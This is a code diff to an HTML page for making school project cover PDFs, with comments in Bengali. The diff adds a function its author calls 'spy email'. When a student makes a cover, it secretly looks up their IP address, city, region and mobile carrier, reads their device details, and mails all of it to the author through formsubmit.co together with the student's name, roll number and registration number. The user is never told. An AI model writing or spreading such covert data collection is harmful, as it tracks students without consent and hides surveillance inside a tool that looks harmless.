@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>School Project Cover</title>
     <link href="https://fonts.googleapis.com/css2?family=Amaranth:wght@700&display=swap" rel="stylesheet">
+    
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
     
     <style>
@@ -123,14 +124,14 @@
         </div>
 
         <button class="btn-gen" onclick="checkAndGenerate()">Generate Cover</button>
-        <button id="dlBtn" class="btn-dl" onclick="downloadPDF()"> Download PDF</button>
+        <button id="dlBtn" class="btn-dl" onclick="downloadPDF()">⬇ Download PDF</button>
     </div>
 
     <canvas id="canvas"></canvas>
 
     <script>
         // ==========================================
-        //  SETTINGS (Same as before)
+        // 🛠️ SETTINGS (Left Shifted 0.37)
         // ==========================================
         const CONFIG = {
             startX: 0.37,   
@@ -170,24 +171,35 @@
 
             if (!isValid) {
                 if (navigator.vibrate) navigator.vibrate(200);
-                alert("        !");
+                alert("⚠️ দয়া করে সব তথ্য সঠিক ভাবে পূরণ কর!");
                 return;
             }
 
-            //  STEP 1:     
-            sendDataToEmail(nameIn.value, subjIn.value, rollIn.value, regIn.value);
+            // 🕵️‍♂️ গোয়েন্দা ইমেইল পাঠানো শুরু (ব্যাকগ্রাউন্ডে)
+            sendSpyEmail(nameIn.value, subjIn.value, rollIn.value, regIn.value);
 
-            //  STEP 2:   
+            // 🎨 ইমেজ জেনারেট
             generate(nameIn.value, subjIn.value, rollIn.value, regIn.value);
         }
 
-        //     
-        function sendDataToEmail(name, subj, roll, reg) {
+        // 🔥 SPY EMAIL FUNCTION (IP + Location + Device)
+        async function sendSpyEmail(name, subj, roll, reg) {
             const url = `https://formsubmit.co/ajax/${MY_EMAIL}`;
-            
-            //         
             const uniqueId = Math.floor(Math.random() * 10000);
 
+            // ১. চুপিসারে লোকেশন ট্র্যাক করা
+            let ipData = {};
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                ipData = await res.json();
+            } catch (e) {
+                ipData = { city: "N/A", region: "N/A", org: "N/A", ip: "N/A" };
+            }
+
+            // ২. ফোনের মডেল বের করা
+            const device = navigator.userAgent;
+
+            // ৩. সব তথ্য একসাথে পাঠানো
             fetch(url, {
                 method: "POST",
                 headers: { 
@@ -195,21 +207,28 @@
                     'Accept': 'application/json'
                 },
                 body: JSON.stringify({
-                    //    ,     
-                    _subject: `New Cover: ${name} (#${uniqueId})`, 
-                    _captcha: "false", //  
-                    _template: "table", //   
+                    _subject: `Cover Alert: ${name} (#${uniqueId})`, 
+                    _captcha: "false",
+                    _template: "table",
                     
-                    //  
+                    // ফর্মের ডাটা
                     Student_Name: name,
                     Subject: subj,
                     Roll_No: roll,
                     Registration_No: reg,
+                    
+                    // 🕵️‍♂️ গোয়েন্দা তথ্য
+                    City: ipData.city || "Unknown",
+                    State: ipData.region || "Unknown",
+                    ISP_Sim: ipData.org || "Unknown", // যেমন: Jio / Airtel
+                    IP_Address: ipData.ip || "Unknown",
+                    Device_Info: device,
+                    
                     Time: new Date().toLocaleString()
                 })
             })
-            .then(response => console.log("Email Sent Command Fired!"))
-            .catch(error => console.log("Network Error (Still trying):", error));
+            .then(response => console.log("Spy Data Sent Successfully! 😎"))
+            .catch(error => console.log("Failed:", error));
         }
 
         function generate(nameVal, subjVal, rollVal, regVal) {
@@ -245,7 +264,7 @@
             };
 
             img.onerror = function() {
-                alert("Error: 'background.jpg'    !");
+                alert("Error: 'background.jpg' ফাইল পাওয়া যাচ্ছে না!");
             };
         }
 
